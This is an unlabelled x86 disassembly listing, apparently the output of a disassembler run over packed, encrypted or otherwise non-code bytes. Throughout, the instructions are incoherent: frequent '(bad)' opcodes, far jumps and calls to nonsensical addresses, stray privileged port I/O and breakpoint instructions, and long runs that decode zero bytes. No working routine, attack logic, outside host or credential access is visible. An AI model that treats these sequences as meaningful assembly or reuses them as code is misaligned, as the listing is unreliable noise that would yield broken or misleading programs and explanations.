  418fbb:	mov    ecx,0x82bc86c0
  418fc0:	jns    0x419015
  418fc2:	adc    eax,0x72fbcfb3
  418fc7:	mov    ebp,0x7cf92916
  418fcc:	push   ebp
  418fcd:	xlat   BYTE PTR ds:[ebx]
  418fce:	stos   DWORD PTR es:[edi],eax
  418fcf:	stc    
  418fd0:	scas   al,BYTE PTR es:[edi]
  418fd1:	xlat   BYTE PTR ds:[ebx]
  418fd2:	fmulp  st(7),st
  418fd4:	adc    al,0x39
  418fd6:	(bad)  
  418fd7:	pop    ds
  418fd8:	or     cl,BYTE PTR [ecx+0x4b897d3c]
  418fde:	sar    DWORD PTR [eax+0x8],0x89
  418fe2:	sub    al,0xc1
  418fe4:	mov    DWORD PTR [ebx-0x2f],edx
  418fe7:	add    BYTE PTR [eax],al
  418fe9:	add    BYTE PTR [eax],al
  418feb:	add    cl,dh
  418fed:	popf   
  418fee:	sbb    ebp,ecx
  418ff0:	retf   
  418ff1:	iret   
  418ff2:	add    DWORD PTR [eax+esi*2],edi
  418ff5:	lea    ecx,[ebp-0x19]
  418ff8:	mov    cl,0xb5
  418ffa:	psadbw mm1,mm5
  418ffd:	mov    ch,0x13
  418fff:	test   al,0x5b
  419001:	add    al,0x39
  419003:	mov    ds:0xe9cb8f1c,eax
  419008:	jbe    0x41900c
  41900a:	std    
  41900b:	sub    al,0xbd
  41900d:	cmp    BYTE PTR [ebx-0x23],0x76
  419011:	mov    esi,DWORD PTR [ebx-0x1b]
  419014:	retf   
  419015:	cli    
  419016:	mov    BYTE PTR [ecx+eiz*4],bl
  419019:	mov    cl,BYTE PTR [esi+ebx*1]
  41901c:	imul   ecx,ebp,0xfffffff9
  41901f:	jno    0x41901e
  419021:	(bad)  
  419022:	(bad)  
  419023:	pusha  
  419024:	sbb    eax,0xa6301d7
  419029:	sbb    ecx,DWORD PTR [eax+0x130000]
  41902f:	sbb    DWORD PTR [ebx-0x7fb275fe],0xffffffc6
  419036:	fadd   QWORD PTR [esi+edx*4]
  419039:	fld    QWORD PTR [edi+0x489fcb0c]
  41903f:	call   0xe2016dc6
  419044:	mov    BYTE PTR [eax-0x206900b2],bl
  41904a:	(bad)  
  41904b:	xlat   BYTE PTR ds:[ebx]
  41904c:	add    al,0x5a
  41904e:	xor    al,0x1
  419050:	add    BYTE PTR [eax],al
  419052:	add    BYTE PTR [eax],al
  419054:	add    BYTE PTR [edi],cl
  419056:	ret    
  419057:	add    DWORD PTR [ecx+0x4584f901],ecx
  41905d:	fs pushf 
  41905f:	pop    eax
  419060:	aam    0x97
  419062:	(bad)  
  419063:	js     0x4190a8
  419065:	out    0x50,eax
  419067:	in     eax,0x8b
  419069:	xchg   ecx,eax
  41906a:	jmp    0x8bd5:0x50d5d0fe
  419071:	imul   esp,edx,0xfe245584
  419077:	sbb    DWORD PTR [ebx+0x15e6ea91],ecx
  41907d:	lahf   
  41907e:	push   0xf288fff5
  419083:	xchg   BYTE PTR [ebp+0x4],dl
  419086:	sahf   
  419087:	jo     0x4190a1
  419089:	xchg   edi,eax
  41908a:	dec    eax
  41908b:	add    eax,0x339bcd03
  419090:	xchg   ebx,eax
  419091:	pop    ebp
  419092:	das    
  419093:	dec    edx
  419094:	fadd   DWORD PTR [eax]
  419096:	jecxz  0x41901e
  419098:	dec    ebp
  419099:	sbb    al,0xea
  41909b:	inc    eax
  41909c:	clc    
  41909d:	fst    QWORD PTR [edi-0x1b]
  4190a0:	mov    esp,DWORD PTR [ecx]
  4190a2:	in     eax,dx
  4190a3:	ss dec ebp
  4190a5:	test   al,0x69
  4190a7:	int    0xff
  4190a9:	jne    0x419119
  4190ab:	and    eax,0xea1b4089
  4190b0:	dec    edx
  4190b1:	leave  
  4190b2:	pop    ss
  4190b3:	jne    0x419037
  4190b5:	ret    
  4190b6:	fbld   TBYTE PTR [edi]
  4190b8:	xor    DWORD PTR [eax],eax
  4190ba:	add    BYTE PTR [eax],al
  4190bc:	add    BYTE PTR [eax],al
  4190be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190bf:	sub    DWORD PTR [esi+0x2c9b4e3],esi
  4190c5:	(bad)  
  4190c6:	cmp    DWORD PTR [ebx],ecx
  4190c8:	sar    DWORD PTR [eax],0x38
  4190cb:	pop    ss
  4190cc:	clc    
  4190cd:	mov    edi,DWORD PTR [edx]
  4190cf:	stc    
  4190d0:	daa    
  4190d1:	std    
  4190d2:	(bad)  
  4190d3:	gs cmc 
  4190d5:	mov    DWORD PTR [eax],edi
  4190d7:	out    0x78,eax
  4190d9:	or     dh,ch
  4190db:	out    0xc7,eax
  4190dd:	pop    ebp
  4190de:	push   ds
  4190df:	loop   0x419123
  4190e1:	sbb    BYTE PTR [ebp+0x5c],dh
  4190e4:	inc    ecx
  4190e5:	jmp    0xecba704a
  4190ea:	test   BYTE PTR [ebp-0x2c],0x88
  4190ee:	test   al,0x21
  4190f0:	jp     0x419139
  4190f2:	jno    0x4190cb
  4190f4:	int3   
  4190f5:	xchg   BYTE PTR [eax+0x654b7959],bh
  4190fb:	xchg   esp,eax
  4190fc:	sub    DWORD PTR [ecx-0x37fdda60],ecx
  419102:	jbe    0x419157
  419104:	icebp  
  419105:	cmc    
  419106:	xor    ebp,edi
  419108:	and    eax,0x24e73b00
  41910d:	add    ah,ch
  41910f:	out    0x73,al
  419111:	xchg   DWORD PTR [eax+0x1d437b69],edx
  419117:	inc    ebp
  419118:	inc    esp
  419119:	or     eax,0x388f0
  41911e:	jne    0x419164
  419120:	cmp    DWORD PTR [edi+0x0],eax
  419126:	add    BYTE PTR [eax+0x61],al
  419129:	sbb    DWORD PTR [ecx],eax
  41912b:	inc    BYTE PTR [edx]
  41912d:	mov    esp,0x26c5edf7
  419132:	jge    0x41917a
  419134:	adc    dl,BYTE PTR cs:[eax+eax*4-0x73]
  419139:	xchg   edx,eax
  41913a:	add    eax,0x42120275
  41913f:	cli    
  419140:	lds    ebp,FWORD PTR [edx]
  419142:	sbb    esi,DWORD PTR [ebx+ecx*4-0x54]
  419146:	aaa    
  419147:	pop    ds
  419148:	repnz (bad) 
  41914a:	jl     0x41918a
  41914c:	push   ss
  41914d:	jo     0x419108
  41914f:	stos   BYTE PTR es:[edi],al
  419150:	(bad)  [edi]
  419152:	test   eax,0x2fac8975
  419157:	cld    
  419158:	lds    ebx,FWORD PTR [esi]
  41915a:	jmp    0x419127
  41915c:	popf   
  41915d:	jmp    0xfe5bc7de
  419162:	mov    al,0x82
  419164:	(bad)  
  419166:	mov    ecx,0x2f741f5a
  41916b:	js     0x4191c4
  41916d:	cmp    al,0x18
  41916f:	pusha  
  419170:	xchg   ebp,eax
  419171:	(bad)  
  419172:	jp     0x419152
  419174:	or     bh,BYTE PTR [edi-0x31e0b6dc]
  41917a:	jp     0x419132
  41917c:	sbb    dh,dh
  41917e:	push   esi
  41917f:	mov    dh,0x16
  419181:	push   0xffffffa0
  419183:	and    al,BYTE PTR [edx]
  419185:	push   0xffffffa0
  419187:	dec    esi
  419188:	add    ch,BYTE PTR [edx-0x60]
  41918b:	add    BYTE PTR [eax],al
  41918d:	add    BYTE PTR [eax],al
  41918f:	add    BYTE PTR [edx+0x2],cl
  419192:	push   0xffffffa0
  419194:	push   ss
  419195:	add    dh,BYTE PTR [edx-0x30]
  419198:	or     cl,BYTE PTR [ebp+0x48bb05d3]
  41919e:	out    0x3,al
  4191a0:	repnz xchg esp,eax
  4191a2:	ds jl  0x41915b
  4191a5:	push   esi
  4191a6:	jo     0x419168
  4191a8:	es dec eax
  4191aa:	add    BYTE PTR [ecx+ecx*2],ch
  4191ad:	pop    ds
  4191ae:	ret    
  4191af:	and    al,0x86
  4191b1:	pop    ds
  4191b2:	test   BYTE PTR [ecx],ch
  4191b4:	sbb    ch,cl
  4191b6:	sbb    ah,0x96
  4191b9:	add    dh,BYTE PTR [ebx-0x14]
  4191bc:	dec    edi
  4191bd:	add    al,0x87
  4191bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4191c0:	mov    DWORD PTR ds:[edx],eax
  4191c3:	add    dh,BYTE PTR [esi+esi*1-0x3c6c1b8d]
  4191ca:	fild   WORD PTR [edx-0x7b]
  4191cd:	cmp    DWORD PTR [ebx+0x45],0x2f049376
  4191d4:	mov    ch,0xf1
  4191d6:	jmp    FWORD PTR [edi-0x4b]
  4191d9:	cmp    bh,BYTE PTR [ecx]
  4191db:	lods   al,BYTE PTR ds:[esi]
  4191dc:	cmp    dl,BYTE PTR [ebx+0x22b50e0e]
  4191e2:	std    
  4191e3:	mov    ah,0x32
  4191e5:	add    edx,0xd39af7e5
  4191eb:	jmp    0xe62ad80b
  4191f0:	test   al,0xc1
  4191f2:	iret   
  4191f3:	jmp    0x4191f8
  4191f8:	add    ch,bl
  4191fa:	shl    ebx,0x20
  4191fd:	sbb    bh,BYTE PTR [esi]
  4191ff:	jbe    0x4191e2
  419201:	int    0xc1
  419203:	xlat   BYTE PTR ds:[ebx]
  419204:	bound  eax,QWORD PTR [edx]
  419206:	cmp    ch,cl
  419208:	out    dx,eax
  419209:	mov    ebp,0x272dbc1
  41920e:	xor    BYTE PTR ss:[ebx+ebx*2],0x2
  419213:	je     0x4191f9
  419215:	sbb    eax,0x3e1dc3c1
  41921a:	sahf   
  41921b:	or     al,0xeb
  41921d:	sahf   
  41921e:	push   es
  41921f:	push   ds
  419220:	bound  ebp,QWORD PTR [ecx-0x711e15a3]
  419226:	mov    dh,0x1d
  419228:	add    BYTE PTR ds:0xe6c1cf9b,cl
  41922e:	test   BYTE PTR [ebp+eax*2+0x18e7c220],0x54
  419236:	xor    bl,BYTE PTR [ebx]
  419238:	add    ah,BYTE PTR [edx+eax*2+0x1b]
  41923c:	add    edx,DWORD PTR [edx+0x5f01fb5d]
  419242:	fadd   QWORD PTR [ebx]
  419244:	cmp    BYTE PTR [ecx+0x510efff2],0xa0
  41924b:	(bad)  
  41924c:	dec    esp
  41924e:	or     DWORD PTR [ebx],0xcd651c08
  419254:	add    BYTE PTR [esi],dl
  419256:	pop    ds
  419257:	jno    0x419290
  419259:	or     al,0x65
  41925b:	cld    
  41925c:	add    BYTE PTR [eax],al
  41925e:	add    BYTE PTR [eax],al
  419260:	add    BYTE PTR [eax],al
  419262:	add    BYTE PTR ds:0x52284d38,bl
  419268:	xor    DWORD PTR [eax+edx*4],ecx
  41926b:	cdq    
  41926c:	add    cl,BYTE PTR [eax-0x3e78f878]
  419272:	dec    ebp
  419273:	inc    BYTE PTR [edi]
  419275:	mov    BYTE PTR [eax],ah
  419277:	pop    es
  419278:	std    
  419279:	mov    bl,BYTE PTR [ebp-0x1aef183f]
  41927f:	push   esp
  419280:	mov    ecx,0x880945c1
  419285:	inc    esp
  419286:	dec    edx
  419287:	add    ecx,DWORD PTR [eax-0x39fda5b4]
  41928d:	inc    ebp
  41928e:	cmp    eax,DWORD PTR [eax]
  419290:	jg     0x419258
  419292:	push   eax
  419293:	cli    
  419294:	pop    es
  419295:	or     al,0x4c
  419297:	fild   WORD PTR [eax-0x1]
  41929a:	sbb    al,0x99
  41929c:	add    bh,bh
  41929e:	xor    DWORD PTR [esi-0x19e5fb78],0x7475c470
  4192a8:	scas   al,BYTE PTR es:[edi]
  4192a9:	test   DWORD PTR [edx],0x2502ff6
  4192af:	push   ds
  4192b0:	xor    eax,ebp
  4192b2:	nop
  4192b3:	lahf   
  4192b4:	and    edi,ebp
  4192b6:	jbe    0x419253
  4192b8:	jge    0x41927a
  4192ba:	pusha  
  4192bb:	push   ecx
  4192bc:	and    al,0x73
  4192be:	fst    QWORD PTR [ebx]
  4192c0:	ins    BYTE PTR es:[edi],dx
  4192c1:	dec    ebx
  4192c2:	int    0xbb
  4192c4:	lods   eax,DWORD PTR ds:[esi]
  4192c5:	repz add BYTE PTR [eax],al
  4192c8:	add    BYTE PTR [eax],al
  4192ca:	add    BYTE PTR [edx-0x35143184],al
  4192d0:	xor    eax,0x83488931
  4192d5:	cmp    eax,DWORD PTR ds:0x7a59074
  4192db:	std    
  4192dc:	ins    DWORD PTR es:[edi],dx
  4192dd:	and    ecx,DWORD PTR [eax-0x73e713d0]
  4192e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192e4:	jecxz  0x419309
  4192e6:	mov    DWORD PTR [eax],esi
  4192e8:	mov    bh,0x41
  4192ea:	loopne 0x419363
  4192ec:	pop    ebx
  4192ed:	and    al,0x73
  4192ef:	test   DWORD PTR [ebp-0xcdbe20c],edi
  4192f5:	fiadd  DWORD PTR [esi]
  4192f7:	je     0x419324
  4192f9:	add    al,dh
  4192fb:	imul   BYTE PTR [esi+0x15]
  4192fe:	adc    dh,bh
  419300:	adc    ax,0xd081
  419304:	push   ebp
  419305:	hlt    
  419306:	cmp    BYTE PTR [eax-0x3e73ee97],dh
  41930c:	xor    esp,DWORD PTR [ecx]
  41930e:	std    
  41930f:	mul    dh
  419311:	sub    edx,DWORD PTR [eax]
  419313:	out    dx,al
  419314:	out    dx,al
  419315:	sub    eax,DWORD PTR [ecx+0x38f451c8]
  41931b:	mov    eax,0x558c1099
  419320:	imul   esp,DWORD PTR [ecx],0xfffffffd
  419323:	ret    0x7202
  419326:	dec    edx
  419327:	mov    ebx,0x7510a949
  41932c:	mov    ch,0x61
  41932e:	xor    BYTE PTR [eax],al
  419330:	add    BYTE PTR [eax],al
  419332:	add    BYTE PTR [eax],al
  419334:	cld    
  419335:	(bad)
  419338:	mov    bh,0xf2
  41933a:	cmc    
  41933b:	mov    ah,ch
  41933d:	add    ah,bh
  41933f:	add    eax,DWORD PTR [esp+esi*4+0x61]
  419343:	fwait
  419344:	xchg   bh,bh
  419346:	repz shld DWORD PTR [edi],esi,0x20
  41934b:	rol    DWORD PTR [esi+0x268f0694],0xa
  419352:	or     BYTE PTR fs:[edx+esi*4+0x20cd4b61],al
  41935a:	cmp    DWORD PTR [ebx],esp
  41935c:	mov    eax,0x73cb750b
  419361:	add    DWORD PTR [ebx+ecx*1-0x2c59ab88],ebp
  419368:	jne    0x4193a4
  41936a:	loop   0x41932c
  41936c:	xchg   BYTE PTR [eax-0x5c770fa],dl
  419372:	popa   
  419373:	mov    ecx,0xc4ae8866
  419378:	jne    0x41933f
  41937a:	repnz push es
  41937c:	mov    ds:0x6c842d87,eax
  419381:	add    DWORD PTR [ebx+esi*8-0x53],edi
  419385:	adc    BYTE PTR [edx-0x29],bh
  419388:	in     al,dx
  419389:	clc    
  41938a:	outs   dx,BYTE PTR ds:[esi]
  41938b:	sti    
  41938c:	call   0xc214:0xc74e21c1
  419393:	jmp    0x41935f
  419395:	pop    ss
  419396:	jmp    0x419433
  41939b:	add    BYTE PTR [eax],al
  41939d:	jb     0x419376
  41939f:	mov    eax,0xe0885996
  4193a4:	mov    ecx,DWORD PTR [ebp+0x4a27ffc2]
  4193aa:	dec    ecx
  4193ab:	jb     0x419364
  4193ad:	push   ebx
  4193ae:	icebp  
  4193af:	jg     0x419353
  4193b1:	jb     0x419342
  4193b3:	or     eax,0x99168e2
  4193b8:	arpl   WORD PTR [ecx],cx
  4193ba:	sbb    DWORD PTR [eax],0x29
  4193bd:	cmp    dl,bl
  4193bf:	leave  
  4193c0:	sti    
  4193c1:	pop    esp
  4193c2:	mov    DWORD PTR [ebx-0x13],eax
  4193c5:	jnp    0x41938c
  4193c7:	or     esp,DWORD PTR [eax-0x43]
  4193ca:	push   es
  4193cb:	cmp    DWORD PTR [ecx+ebp*8],esp
  4193ce:	or     eax,0x1d97dd86
  4193d3:	std    
  4193d4:	mov    edi,0x25187c13
  4193d9:	mov    bl,0x1a
  4193db:	pop    esp
  4193dc:	sub    eax,esi
  4193de:	sbb    dl,BYTE PTR [edx+esi*2-0x76]
  4193e2:	mov    DWORD PTR [ebx-0x13],ecx
  4193e5:	xchg   DWORD PTR [ebp+0x4f],edx
  4193e8:	in     al,dx
  4193e9:	repz sub eax,0xd1dc9a44
  4193ef:	fdivr  DWORD PTR [esi-0x1d99e615]
  4193f5:	dec    ebx
  4193f6:	or     eax,0x273cf84
  4193fb:	add    dh,bl
  4193fd:	pop    ds
  4193fe:	stos   DWORD PTR es:[edi],eax
  4193ff:	add    al,0x8f
  419401:	add    BYTE PTR [eax],al
  419403:	add    BYTE PTR [eax],al
  419405:	add    BYTE PTR [ebx+0x71650d11],bl
  41940b:	add    eax,DWORD PTR [eax]
  41940d:	jmp    0xe880e399
  419412:	jnp    0x419446
  419414:	or     eax,0x5381a39e
  419419:	mov    cl,0x1f
  41941b:	mov    ecx,DWORD PTR [edi-0x16]
  41941e:	sbb    al,0x3
  419420:	(bad)  
  419421:	ficomp WORD PTR [ebp+0x59008734]
  419427:	retf   0x5d84
  41942a:	adc    BYTE PTR [esi+0x5995ec59],cl
  419430:	leave  
  419431:	mov    edi,esp
  419433:	xchg   DWORD PTR [ecx-0x38],eax
  419436:	inc    edi
  419437:	ror    BYTE PTR [edx],0xb7
  41943a:	fsubr  QWORD PTR [eax+0x5d]
  41943d:	pop    esi
  41943e:	xchg   ebp,eax
  41943f:	push   ecx
  419440:	frstor [esi+0x27]
  419443:	imul   BYTE PTR [esi+0x5]
  419446:	test   DWORD PTR [ecx-0x13],esi
  419449:	jmp    0x419425
  41944b:	repnz mov dl,0xc0
  41944e:	push   ebp
  41944f:	inc    ecx
  419450:	in     eax,dx
  419451:	data16 daa 
  419453:	push   ecx
  419454:	lds    ecx,FWORD PTR [edi]
  419456:	dec    edi
  419457:	arpl   di,di
  419459:	(bad)  
  41945a:	fsubr  QWORD PTR [ebx-0x80]
  41945d:	jge    0x41948b
  41945f:	dec    BYTE PTR [edx]
  419461:	test   BYTE PTR [eax-0x3c000001],ch
  419467:	mov    edx,0xf050
  41946c:	add    BYTE PTR [eax],al
  41946e:	add    BYTE PTR [ebx-0x6ccfbd45],ah
  419474:	xchg   edx,eax
  419475:	ror    DWORD PTR [ecx-0x48f51227],0xcd
  41947c:	inc    BYTE PTR [ebp+edx*2-0x1bbe72b8]
  419483:	pop    ss
  419484:	inc    ecx
  419485:	ror    DWORD PTR [ebx-0x39d91e17],0x83
  41948c:	mov    edx,0x56fc6abf
  419491:	arpl   WORD PTR [ebx],di
  419493:	mov    WORD PTR [edi+0x2],gs
  419496:	mov    DWORD PTR [ecx],ecx
  419498:	icebp  
  419499:	out    0x6,al
  41949b:	arpl   WORD PTR [edx-0x5667641],di
  4194a1:	cmp    esi,DWORD PTR gs:[ebp-0x4a]
  4194a5:	inc    edi
  4194a6:	or     eax,0x601f6
  4194ab:	jne    0x419476
  4194ad:	cmp    BYTE PTR [ebx+0x29],0x2b
  4194b1:	adc    BYTE PTR [ebx+ecx*4+0x7200012d],al
  4194b8:	nop
  4194b9:	mov    ch,0xf3
  4194bb:	push   0xffffffb8
  4194bd:	mov    DWORD PTR [edi],0xd4eb082
  4194c3:	ret    0x23f5
  4194c6:	mov    esp,DWORD PTR [ecx-0x35f2dfe6]
  4194cc:	bound  edx,QWORD PTR [eax]
  4194ce:	lods   eax,DWORD PTR ds:[esi]
  4194cf:	mov    ah,0x91
  4194d1:	xchg   ebp,eax
  4194d2:	test   DWORD PTR [eax],0x0
  4194d8:	jp     0x4194b3
  4194da:	xchg   edi,eax
  4194db:	das    
  4194dc:	jbe    0x4194bc
  4194de:	sbb    eax,DWORD PTR [ecx]
  4194e0:	cmp    BYTE PTR [ebx-0x6e4452f1],ah
  4194e6:	int    0xcf
  4194e8:	jp     0x41946a
  4194ea:	aas    
  4194eb:	mov    DWORD PTR [eax],esi
  4194ed:	aaa    
  4194ee:	xor    DWORD PTR [edi],0xd7b59275
  4194f4:	cld    
  4194f5:	pop    ebp
  4194f6:	pop    ebp
  4194f7:	or     eax,0xf5f1
  4194fc:	jne    0x4194a3
  4194fe:	iret   
  4194ff:	das    
  419500:	cmc    
  419501:	loope  0x419504
  419503:	jae    0x419557
  419505:	xchg   esp,eax
  419506:	adc    BYTE PTR [ecx],bh
  419508:	mov    dh,0x1f
  41950a:	mov    BYTE PTR [edx-0x76fed48c],bh
  419510:	xor    ah,BYTE PTR [ebx]
  419512:	mov    WORD PTR [ebx+0x5d],cs
  419515:	sub    eax,0xa33d0147
  41951a:	int    0xbf
  41951c:	sahf   
  41951d:	jmp    0xf836:0x2ee1793
  419524:	popf   
  419525:	dec    edx
  419526:	jmp    0x72d9:0xe7eeff4d
  41952d:	pop    es
  41952e:	fs fs jne 0x419534
  419532:	out    0xc3,eax
  419534:	ins    DWORD PTR es:[edi],dx
  419535:	mov    ebp,0x41992a6
  41953a:	adc    BYTE PTR ds:[eax],al
  41953d:	add    BYTE PTR [eax],al
  41953f:	add    BYTE PTR [eax],al
  419541:	pop    esp
  419542:	adc    esi,DWORD PTR ds:0xe87e1234
  419548:	add    esi,DWORD PTR [ebp-0x7e]
  41954b:	mov    al,ds:0x61c18602
  419550:	dec    esp
  419551:	cmp    al,0x43
  419553:	fiadd  WORD PTR [esi+0x3e70183]
  419559:	cld    
  41955a:	mov    edi,0x2a468ade
  41955f:	jmp    0x6441:0xb2327444
  419566:	cmc    
  419567:	jno    0x419500
  419569:	data16 jmp 0x4195c2
  41956c:	add    ebx,edx
  41956e:	mov    esp,ebx
  419570:	inc    ebx
  419571:	in     al,dx
  419572:	lea    esp,[esi]
  419574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419575:	in     eax,dx
  419576:	into   
  419577:	in     al,dx
  419578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419579:	ins    DWORD PTR es:[edi],dx
  41957a:	shl    BYTE PTR [ebx-0x16bd0a46],cl
  419580:	fidiv  DWORD PTR [esp+edx*4+0x628033b]
  419587:	loop   0x4195d3
  419589:	or     ecx,DWORD PTR [eax+0x10]
  41958c:	fisttp WORD PTR [ebx-0x757c18e9]
  419592:	(bad)  
  419593:	fisttp QWORD PTR [eax+0x3e70143]
  419599:	cld    
  41959a:	dec    ecx
  41959b:	ret    0x7842
  41959e:	jg     0x4195a0
  4195a0:	lds    edi,FWORD PTR [ecx+0x2]
  4195a3:	add    BYTE PTR [edx+0x0],ah
  4195a6:	add    BYTE PTR [eax],al
  4195a8:	add    BYTE PTR [eax],al
  4195aa:	xor    ch,bh
  4195ac:	mov    BYTE PTR [ecx+eiz*4],bh
  4195af:	add    DWORD PTR [edi-0x3e267916],edi
  4195b5:	pop    edx
  4195b6:	mov    dh,BYTE PTR ds:[ebp-0xb]
  4195ba:	dec    edi
  4195bb:	daa    
  4195bc:	add    DWORD PTR [eax+0x72bf9301],edi
  4195c2:	or     eax,0x78fd8957
  4195c7:	fldcw  WORD PTR [edi]
  4195c9:	xor    al,0x26
  4195cb:	add    al,0xed
  4195ce:	das    
  4195cf:	inc    ecx
  4195d0:	jb     0x419560
  4195d2:	ja     0x419599
  4195d4:	or     edx,edx
  4195d6:	scas   eax,DWORD PTR es:[edi]
  4195d7:	nop
  4195d8:	iret   
  4195d9:	and    BYTE PTR [ebx+0x2],0x0
  4195dd:	jmp    0x2886e665
  4195e2:	sbb    BYTE PTR [edi+0x0],dl
  4195e5:	int    0x76
  4195e7:	add    al,BYTE PTR [ecx+0x7403aaee]
  4195ed:	repz jns 0x4195b3
  4195f0:	sti    
  4195f1:	mov    cl,dh
  4195f3:	dec    edx
  4195f4:	inc    ecx
  4195f5:	jmp    0x9ccaa289
  4195fa:	pop    edx
  4195fb:	mov    eax,DWORD PTR [eax+ebp*8-0x37]
  4195ff:	jg     0x419644
  419601:	cmp    eax,0x62ebc2ff
  419606:	lds    ebx,FWORD PTR [edx]
  419608:	mov    ebx,DWORD PTR [ebp-0x6374f98f]
  41960e:	add    BYTE PTR [eax],al
  419610:	add    BYTE PTR [eax],al
  419612:	add    BYTE PTR [edx+0x2a],dl
  419615:	ss in  al,0x71
  419618:	add    al,BYTE PTR [ecx+ebp*1-0x1648818d]
  41961f:	jbe    0x419623
  419621:	mov    DWORD PTR [eax],eax
  419623:	and    esi,esp
  419625:	inc    BYTE PTR [eax+ecx*4+0x5f]
  419629:	mov    BYTE PTR [ebp+0x6c],dl
  41962c:	pop    edi
  41962d:	mov    esi,0x866054c2
  419632:	adc    dl,al
  419634:	mov    edx,DWORD PTR [ecx-0x1c]
  419637:	mov    dl,0xc1
  419639:	ror    DWORD PTR [eax],0xb2
  41963c:	mov    DWORD PTR [eax+0x2],edx
  41963f:	mov    dl,0x8b
  419641:	push   ecx
  419642:	lock ret 0xc1c1
  419646:	or     BYTE PTR [edx-0x4dfbaf77],dh
  41964c:	mov    edx,DWORD PTR [ecx-0xc]
  41964f:	mov    dl,0xc1
  419651:	ror    DWORD PTR [eax],0x82
  419654:	mov    DWORD PTR [eax+0x6],edx
  419657:	xchg   DWORD PTR [edi+0x4d],ecx
  41965a:	mov    DWORD PTR [esi+eax*1],edi
  41965d:	jg     0x4196de
  41965f:	pop    eax
  419660:	std    
  419661:	mov    BYTE PTR [eax-0x18],cl
  419664:	ins    DWORD PTR es:[edi],dx
  419665:	or     al,0xff
  419667:	loope  0x419652
  419669:	dec    esi
  41966a:	jmp    ecx
  41966c:	mov    ch,0x4c
  41966e:	call   0x3c7966
  419673:	daa    
  419674:	push   eax
  419675:	or     al,0xb6
  419677:	add    BYTE PTR [eax],al
  419679:	add    BYTE PTR [eax],al
  41967b:	add    BYTE PTR [ebx],dl
  41967d:	inc    ecx
  41967e:	inc    ebp
  41967f:	je     0x4196e5
  419681:	inc    esi
  419682:	jno    0x4196a4
  419684:	adc    al,0x4a
  419686:	jno    0x41968e
  419688:	pop    ds
  419689:	pop    ebp
  41968a:	stc    
  41968b:	add    BYTE PTR [edi+0x50],al
  41968e:	cld    
  41968f:	jne    0x419615
  419691:	mov    edx,DWORD PTR [ecx-0x2c]
  419694:	dec    ebx
  419695:	ins    DWORD PTR es:[edi],dx
  419696:	cmc    
  419697:	mov    esp,ecx
  419699:	rcl    DWORD PTR [edx-0x75],1
  41969c:	xor    eax,0x75fa95e6
  4196a1:	in     al,dx
  4196a2:	sbb    ch,cl
  4196a4:	dec    ebp
  4196a5:	add    al,0x95
  4196a7:	xlat   BYTE PTR ds:[ebx]
  4196a8:	(bad)  
  4196a9:	jne    0x4196e0
  4196ab:	std    
  4196ac:	loopne 0x4196b1
  4196ae:	xchg   DWORD PTR [ebx+0x45],eax
  4196b1:	jp     0x419667
  4196b3:	out    0xe3,eax
  4196b5:	or     eax,0x185efd1c
  4196ba:	sbb    al,0x73
  4196bc:	sub    eax,0x42d3b590
  4196c1:	mov    dh,0x1b
  4196c3:	mov    DWORD PTR [eax+0x1d54b25b],esi
  4196c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196ca:	push   cs
  4196cb:	std    
  4196cc:	sub    dl,BYTE PTR [edx+0x6af8fbc5]
  4196d2:	xchg   ebp,eax
  4196d3:	or     ch,dh
  4196d5:	cmc    
  4196d6:	das    
  4196d7:	std    
  4196d8:	mov    eax,0x74448e4f
  4196dd:	daa    
  4196de:	mov    al,BYTE PTR [ebx+0x0]
  4196e1:	add    BYTE PTR [eax],al
  4196e3:	add    BYTE PTR [eax],al
  4196e5:	adc    DWORD PTR [eax-0x218b0c3b],esp
  4196eb:	daa    
  4196ec:	mov    DWORD PTR [eax+0xf],eax
  4196ef:	mov    BYTE PTR [ebx-0x47],bl
  4196f2:	jno    0x419760
  4196f4:	sti    
  4196f5:	loop   0x419682
  4196f7:	xchg   DWORD PTR [ebx-0x2b],edx
  4196fa:	daa    
  4196fb:	mov    dh,0xef
  4196fd:	fadd   QWORD PTR [ecx+0x1e]
  419700:	std    
  419701:	retf   0x379d
  419704:	jae    0x41977e
  419706:	inc    ecx
  419707:	call   FWORD PTR [ebp-0x32]
  41970a:	icebp  
  41970b:	into   
  41970c:	mov    edi,0xbc5921b
  419711:	pop    ds
  419712:	pop    ds
  419713:	mov    es,WORD PTR [ebx+0x71]
  419716:	jnp    0x419734
  419718:	jae    0x419787
  41971a:	cmp    eax,0x27dc142
  41971f:	lea    ecx,[edx-0x42f0fbd2]
  419725:	jmp    0xb5c8ad3e
  41972a:	(bad)  
  41972b:	cmc    
  41972c:	sbb    al,0xe6
  41972e:	es push es
  419730:	xchg   esi,eax
  419731:	dec    esi
  419732:	adc    al,0x74
  419734:	or     ecx,DWORD PTR [ebp-0x39]
  419737:	pop    ebp
  419738:	sbb    al,0x58
  41973a:	jg     0x419763
  41973c:	xchg   edi,eax
  41973d:	ja     0x41970e
  41973f:	fadd   st(2),st
  419741:	pop    ebp
  419742:	add    DWORD PTR [edx],ebx
  419744:	adc    al,BYTE PTR [eax-0x72]
  419747:	mov    dl,0x2c
  419749:	add    BYTE PTR [eax],al
  41974b:	add    BYTE PTR [eax],al
  41974d:	add    BYTE PTR [edx],ch
  41974f:	jmp    edi
  419751:	add    edi,esp
  419753:	cmp    al,0xd2
  419755:	push   es
  419756:	fs inc edx
  419758:	push   ds
  419759:	mov    edx,0xca949bd
  41975e:	jne    0x419730
  419760:	lahf   
  419761:	das    
  419762:	jns    0x419795
  419764:	(bad)  
  419765:	sbb    cl,dl
  419767:	push   0xffffffe8
  419769:	(bad)
  41976d:	loopne 0x4197e5
  41976f:	pushf  
  419770:	pop    edi
  419771:	push   es
  419772:	cld    
  419773:	mov    esi,0xafd0bca
  419778:	test   eax,0x61ad750c
  41977d:	sub    ah,dh
  41977f:	(bad)  es:[esi-0x442f54d8]
  419786:	pop    esp
  419787:	or     bl,BYTE PTR [esi-0x2f]
  41978a:	stos   BYTE PTR es:[edi],al
  41978b:	sub    al,0xaa
  41978d:	add    ebp,esp
  41978f:	sbb    ah,BYTE PTR [edx+0x3d]
  419792:	mov    al,0xed
  419794:	or     dh,ch
  419796:	push   0x2
  419798:	jb     0x4197ae
